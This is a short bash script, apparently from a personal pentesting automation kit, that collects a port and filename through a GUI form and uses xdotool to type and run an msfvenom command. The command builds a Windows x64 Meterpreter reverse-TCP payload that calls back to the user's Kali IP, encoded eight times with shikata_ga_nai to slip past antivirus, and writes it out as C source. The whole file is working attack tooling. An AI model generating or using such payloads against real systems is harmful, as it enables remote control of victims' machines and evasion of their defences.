#!/bin/bash

: '
Create C file
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "LPORT" "filename"

LPORT=${form_data["LPORT"]}
FILE=${form_data["filename"]}

paste_command "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${KALI_IP} LPORT=${LPORT} -e x86/shikata_ga_nai -i 8 -f c -o ${FILE}.c"
xdotool key Return